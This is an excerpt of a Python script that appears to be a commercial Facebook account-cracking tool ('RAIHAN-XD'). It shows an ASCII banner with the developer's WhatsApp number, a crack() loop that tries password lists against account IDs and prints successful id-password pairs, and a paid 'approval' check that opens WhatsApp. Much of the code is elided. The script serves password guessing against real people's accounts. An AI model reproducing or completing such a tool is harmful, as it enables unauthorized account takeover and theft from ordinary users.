...
def banner():
	print(f"""
    \33[1;36m       ____  ___    ______  _____    __  ___
   \33[1;36m / __ \/   |  /  _/ / / /   |  /  |/  /
 \33[1;36m  / /_/ / /| |  / // /_/ / /| | / /|_/ / 
 \33[1;36m / _, _/ ___ |_/ // __  / ___ |/ /  / /  
 \33[1;36m/_/ |_/_/  |_/___/_/ /_/_/  |_/_/  /_/   
                                         
                                         
             
\33[1;37m--------------------------------------------
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m DEVELOPER :   Mr.Raihan
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m TOOLS     :   FILE & RANDOM
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m GITHUB    :   MHAMUD-RAIHAN-404
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m VERSION   :   1.1.2
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m WHATSAPP  :   +8801894377005
\33[1;37m--------------------------------------------""")
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [RAIHAN-XD] {h}{loop}|{len(id)} | OK:-{h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\r\x1b[38;5;46m[RAIHAN-OK] '+idf+ ' | '+pw+'')
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/MAHMUD-RAIHAN-404/New-Project-2023-/blob/main/Approvle.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Tooken%20:%20'+id);os.system('am start https://wa.me/+8801894377005?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
